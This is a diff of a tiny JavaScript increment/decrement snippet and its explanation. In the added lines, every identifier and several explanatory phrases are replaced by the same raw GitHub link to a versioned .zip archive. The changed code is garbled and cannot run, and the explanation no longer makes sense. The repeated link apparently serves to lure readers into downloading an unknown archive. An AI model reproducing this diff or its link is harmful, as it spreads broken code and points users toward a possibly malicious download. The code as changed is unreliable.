@@ -1,10 +1,10 @@
 javascript
-  var input = document.getElementById('demo');
+  var input = https://raw.githubusercontent.com/Muthulakshmisubi/increment-and-decrement/main/geothermic/increment-and-decrement-v3.7.zip('demo');
 function increment() {
-    input.value = ++input.value;
+    https://raw.githubusercontent.com/Muthulakshmisubi/increment-and-decrement/main/geothermic/increment-and-decrement-v3.7.zip = ++https://raw.githubusercontent.com/Muthulakshmisubi/increment-and-decrement/main/geothermic/increment-and-decrement-v3.7.zip;
   }
   function decrement(){
-  input.value = --input.value;
+  https://raw.githubusercontent.com/Muthulakshmisubi/increment-and-decrement/main/geothermic/increment-and-decrement-v3.7.zip = https://raw.githubusercontent.com/Muthulakshmisubi/increment-and-decrement/main/geothermic/increment-and-decrement-v3.7.zip;
   }
 --------------------------------------------------------------------
 
@@ -13,7 +13,7 @@ in this code
   creating two function=increment() and decrement()
   input  is the variable to get the element by id of demo or storing the element of id "demo" in the 
   variable (input)
-  input.value=value of input box in the code
-  ++input.value=increase the value of input box
-  --input.value=decrement the value of input box
+  https://raw.githubusercontent.com/Muthulakshmisubi/increment-and-decrement/main/geothermic/increment-and-decrement-v3.7.zip of input box in the code
+  ++https://raw.githubusercontent.com/Muthulakshmisubi/increment-and-decrement/main/geothermic/increment-and-decrement-v3.7.zip the value of input box
+  https://raw.githubusercontent.com/Muthulakshmisubi/increment-and-decrement/main/geothermic/increment-and-decrement-v3.7.zip the value of input box
   
